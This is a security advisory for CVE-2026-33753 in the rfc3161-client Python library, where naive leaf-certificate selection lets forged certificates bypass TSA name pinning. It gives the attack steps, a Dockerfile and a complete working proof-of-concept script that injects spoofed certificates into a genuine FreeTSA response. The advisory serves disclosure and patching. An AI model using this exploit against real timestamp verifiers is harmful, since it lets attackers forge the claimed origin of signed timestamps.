# [M] rfc3161-client Has Improper Certificate Validation

## Summary
Severity: Medium
Advisory: GHSA-3xxc-pwj6-jgrj
CVE: CVE-2026-33753
CWE: CWE-295
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-04-08
Source: https://github.com/advisories/GHSA-3xxc-pwj6-jgrj
Type: github-advisory

## Affected
- PyPI: `rfc3161-client` — affected >=0 <1.0.6

## Details
### Summary

An Authorization Bypass vulnerability in `rfc3161-client`'s signature verification allows any attacker to impersonate a trusted TimeStamping Authority (TSA). By exploiting a logic flaw in how the library extracts the leaf certificate from an unordered PKCS#7 bag of certificates, an attacker can append a spoofed certificate matching the target `common_name` and Extended Key Usage (EKU) requirements. This tricks the library into verifying these authorization rules against the forged certificate while validating the cryptographic signature against an actual trusted TSA (such as FreeTSA), thereby bypassing the intended TSA authorization pinning entirely.

### Details

The root cause lies in `rfc3161_client.verify.Verifier._verify_leaf_certs()`. The library attempts to locate the leaf certificate within the parsed TimeStampResponse PKCS#7 `SignedData` bag using a naive algorithm:

```python
leaf_certificate_found = None
for cert in certs:
    if not [c for c in certs if c.issuer == cert.subject]:
        leaf_certificate_found = cert
        break
```

This loop erroneously assumes that the valid leaf certificate is simply the first certificate in the bag that does not issue any other certificate. It does **not** rely on checking the `ESSCertID` or `ESSCertIDv2` cryptographic bindings specified in RFC 3161 (which binds the signature securely to the exact signer certificate).

An attacker can exploit this by:

1. Acquiring a legitimate, authentic TimeStampResponse from *any* widely trusted public TSA (e.g., FreeTSA) that chains up to a Root CA trusted by the client.
2. Generating a self-signed spoofed "proxy" certificate `A` with the exact `Subject` (e.g., `CN=Intended Corporate TSA`) and `ExtendedKeyUsage` (`id-kp-timeStamping`) required by the client's `VerifierBuilder`.
3. Generating a dummy certificate `D` issued by the *actual* FreeTSA leaf certificate.
4. Appending both `A` and `D` to the `certificates` list in the PKCS#7 `SignedData` of the TimeStampResponse.

When `_verify_leaf_certs()` executes, the dummy certificate `D` disqualifies the authentic FreeTSA leaf from being selected (because FreeTSA now technically "issues" `D` within the bag). The loop then evaluates the spoofed certificate `A`, realizes it issues nothing else in the bag, and selects it as `leaf_certificate_found`.

The library then processes the `common_name` and EKU checks exactly against `A`. Since `A` was explicitly forged to pass these checks, verification succeeds. Finally, the OpenSSL `pkcs7_verify` backend validates the actual cryptographic signature using the authentic FreeTSA certificate and trusted roots (ignoring the injected certs). The application wrongly trusts that the timestamp was granted by the pinned TSA.

### PoC

The environment simulation and the PoC script have been included in the `poc.py` and `Dockerfile` artifacts:

**Dockerfile (`poc/Dockerfile`)**:

```dockerfile
FROM python:3.11-slim
RUN apt-get update && apt-get install -y build-essential libssl-dev libffi-dev python3-dev cargo rustc pkg-config git && rm -rf /var/lib/apt/lists/*
WORKDIR /app
COPY . /app/rfc3161-client
RUN pip install cryptography requests asn1crypto
WORKDIR /app/rfc3161-client
RUN pip install .
COPY poc/poc.py /app/poc.py
WORKDIR /app
CMD ["python", "poc.py"]
```

The attack flow locally demonstrated in `poc/poc.py`:

``` python
import base64
import requests
from rfc3161_client import TimestampRequestBuilder, decode_timestamp_response, HashAlgorithm
from rfc3161_client.verify import VerifierBuilder
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.x509.oid import NameOID, ExtendedKeyUsageOID
import datetime
from asn1crypto import cms, tsp

def main():
    print("[*] Generating TimeStampRequest...")
    req_builder = TimestampRequestBuilder(
        data=b"hello world",
        hash_algorithm=HashAlgorithm.SHA256,
        cert_req=True
    )
    req = req_builder.build()
    
    print("[*] Contacting FreeTSA to fetch a genuine digitally signed timestamp...")
    resp = requests.post(
        "https://freetsa.org/tsr",
        data=req.as_bytes(),
        headers={"Content-Type": "application/timestamp-query"}
    )
    if resp.status_code != 200:
        print("[-] Failed to get TSA response. Is the network up?")
        return
        
    tsa_resp_bytes = resp.content
    
    print("[*] Creating forged certificate (Common Name: Spoofed TSA, EKU: timeStamping)...")
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    subject = issuer = x509.Name([
        x509.NameAttribute(NameOID.COMMON_NAME, "Spoofed TSA"),
    ])
    
    # We create a self-signed spoofed certificate that meets all Python verification criteria
    cert = x509.CertificateBuilder().subject_name(
        subject
    ).issuer_name(
        issuer
    ).public_key(
        private_key.public_key()
    ).serial_number(
        x509.random_serial_number()
    ).not_valid_before(
        datetime.datetime.utcnow() - datetime.timedelta(days=1)
    ).not_valid_after(
        datetime.datetime.utcnow() + datetime.timedelta(days=1)
    ).add_extension(
        x509.ExtendedKeyUsage([ExtendedKeyUsageOID.TIME_STAMPING]),
        critical=True,
    ).sign(private_key, hashes.SHA256())
    
    fake_cert_der = cert.public_bytes(serialization.Encoding.DER)
    
    print("[*] Parsing the authentic PKCS#7 SignedData bag of certificates...")
    tinfo = tsp.TimeStampResp.load(tsa_resp_bytes)
    status = tinfo['status']['status'].native
    if status != 'granted':
        print(f"[-] Status not granted: {status}")
        return
        
    content_info = tinfo['time_stamp_token']
    assert content_info['content_type'].native == 'signed_data'
    signed_data = content_info['content']
    
    certs = signed_data['certificates']
    
    from asn1crypto.x509 import Certificate
    fake_cert_asn1 = Certificate.load(fake_cert_der)
    
    real_leaf_asn1 = None
    for c in certs:
        c_subject = c.chosen['tbs_certificate']['subject']
        issues_something = False
        for oc in certs:
            if c == oc: continue
            oc_issuer = oc.chosen['tbs_certificate']['issuer']
            if c_subject == oc_issuer:
                issues_something = True
                break
        if not issues_something:
            real_leaf_asn1 = c
            break
            
    if real_leaf_asn1:
        print("[*] Found the genuine TS leaf certificate. Creating a 'dummy node' to disqualify it from the library's naive leaf discovery...")
        real_leaf_crypto = x509.load_der_x509_certificate(real_leaf_asn1.dump())
        dummy_priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        dummy_cert = x509.CertificateBuilder().subject_name(
            x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "Dummy Entity")])
        ).issuer_name(
            real_leaf_crypto.subject
        ).public_key(
            dummy_priv.public_key()
        ).serial_number(
            x509.random_serial_number()
        ).not_valid_before(
            datetime.datetime.utcnow() - datetime.timedelta(days=1)
        ).not_valid_after(
            datetime.datetime.utcnow() + datetime.timedelta(days=1)
        ).sign(dummy_priv, hashes.SHA256()) 
        
        dummy_cert_asn1 = Certificate.load(dummy_cert.public_bytes(serialization.Encoding.DER))
        certs.append(dummy_cert_asn1)

    print("[*] Injecting the malicious spoofed proxy certificate into the response bag...")
    certs.append(fake_cert_asn1)
    
    malicious_resp_bytes = tinfo.dump()
    
    print("[*] Downloading FreeTSA Root Certificate Trust Anchor...")
    root_resp = requests.get("https://freetsa.org/files/cacert.pem")
    root_cert = x509.load_pem_x509_certificate(root_resp.content)
    # We must also download TSA.crt which acts as an intermediate for FreeTSA
    tsa_resp_cert = requests.get("https://freetsa.org/files/tsa.crt")
    tsa_cert_obj = x509.load_pem_x509_certificate(tsa_resp_cert.content)
    
    print("[*] Initializing Verifier strictly pinning Common Name to 'Spoofed TSA'...")
    tsa_resp_obj = decode_timestamp_response(malicious_resp_bytes)
    
    verifier = VerifierBuilder(
        common_name="Spoofed TSA",
        roots=[root_cert],
        intermediates=[tsa_cert_obj],
    ).build()

    print("[*] Attempting Verification...")
    try:
        verifier.verify_message(tsa_resp_obj, b"hello world")
        print("\n\033[92m[+] VULNERABILITY CONFIRMED: Authorization Bypass successful! The Verifier accepted the authentic signature under the forged 'Spoofed TSA' name due to Trust Boundary Confusion.\033[0m\n")
    except Exception as e:
        print("\n\033[91m[-] Verification failed:\033[0m", e)

if __name__ == '__main__':
    main()
```

1. Requests a timestamp from `https://freetsa.org/tsr`.
2. Generates a fake cert with `common_name="Spoofed TSA"` and `ExtendedKeyUsage=TIME_STAMPING`.
3. Parses the authentic TS response, injects a dummy cert issued by FreeTSA's leaf.
4. Injects the fake cert into the bag.
5. Invokes `decode_timestamp_response()` on the malicious bytes.
6. Runs `VerifierBuilder(common_name="Spoofed TSA", ...).verify_message(malicious_resp, msg)`.
7. Observes a successful verification bypassing the `common_name` constraint.

### Impact

**Vulnerability Type:** Authorization Bypass / Improper Certificate Validation / Trust Boundary Confusion
**Impact:** High. Applications relying on `rfc3161-client` to guarantee the origin of a timestamp via `tsa_certificate` or `common_name` pinning are completely exposed to impersonation. An attacker can forge the identity of the TSA as long as they hold *any* valid timestamp from a CA trusted by the Verifier.

## References
- https://github.com/trailofbits/rfc3161-client/security/advisories/GHSA-3xxc-pwj6-jgrj
- https://nvd.nist.gov/vuln/detail/CVE-2026-33753
- https://github.com/trailofbits/rfc3161-client/commit/4f7d372297b4fba7b0119e9f954e4495ec0592c0
- https://github.com/trailofbits/rfc3161-client
- https://github.com/trailofbits/rfc3161-client/releases/tag/v1.0.6
